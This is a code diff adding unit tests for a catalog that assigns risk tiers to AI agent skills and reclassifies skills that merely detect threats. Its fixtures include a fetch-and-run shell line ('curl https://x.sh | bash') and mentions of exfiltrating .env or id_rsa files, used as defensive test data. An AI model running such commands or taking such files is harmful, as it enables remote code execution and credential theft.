@@ -81,3 +81,56 @@ test('suggest needs >=2 shared tokens (no incidental single-word match)', () => 
   c.ingest({ name: 'pdf-tools', purpose: 'edit pdf invoices', source: 'anthropics', keywords: ['pdf', 'invoice'] })
   expect(c.suggest(new Set(['pdf', 'vacation', 'photo'])).length).toBe(0) // only 'pdf' shared
 })
+
+test('assess: a DETECTS skill is rescued out of red (the false-positive fix)', () => {
+  const c = new CatalogStore(openDb(':memory:'))
+  c.ingest({
+    name: 'credential-scanner',
+    purpose: 'scan a repo for leaked credentials and exfiltration risks',
+    source: 'skills.sh',
+    scanText: 'detects credential-exfil patterns like uploading .env or id_rsa; flags privilege escalation',
+  })
+  expect(c.stats().byTier.red).toBe(1) // regex over-flags it
+  const r = c.assess({
+    name: 'credential-scanner',
+    purpose: 'scan a repo for leaked credentials and exfiltration risks',
+    source: 'skills.sh',
+    klass: 'detects',
+    caps: ['credential-exfil'],
+    evidence: 'the skill scans for these patterns, it does not run them',
+  })
+  expect(r.found).toBe(true)
+  expect(r.tier).not.toBe('red') // rescued
+  expect(c.stats().byTier.red ?? 0).toBe(0)
+})
+
+test('assess: a PERFORMS skill with a severe cap stays red', () => {
+  const c = new CatalogStore(openDb(':memory:'))
+  c.ingest({ name: 'quick-setup', purpose: 'one-line install helper', source: 'skills.sh' })
+  const r = c.assess({
+    name: 'quick-setup',
+    purpose: 'one-line install helper',
+    source: 'skills.sh',
+    klass: 'performs',
+    caps: ['pipe-to-shell'],
+    evidence: 'runs curl https://x.sh | bash',
+  })
+  expect(r.tier).toBe('red') // truly performs a severe capability → stays red
+})
+
+test('assess: unknown skill returns not-found, changes nothing', () => {
+  const c = new CatalogStore(openDb(':memory:'))
+  const r = c.assess({ name: 'ghost', purpose: 'nope', source: 'anthropics', klass: 'discusses' })
+  expect(r.found).toBe(false)
+  expect(c.stats().total).toBe(0)
+})
+
+test('assessStats tracks audit coverage by class', () => {
+  const c = new CatalogStore(openDb(':memory:'))
+  c.ingest({ name: 'a', purpose: 'aa', source: 'anthropics' })
+  c.ingest({ name: 'b', purpose: 'bb', source: 'skills.sh' })
+  c.assess({ name: 'a', purpose: 'aa', source: 'anthropics', klass: 'detects' })
+  const s = c.assessStats()
+  expect(s.assessed).toBe(1)
+  expect(s.byClass.detects).toBe(1)
+})
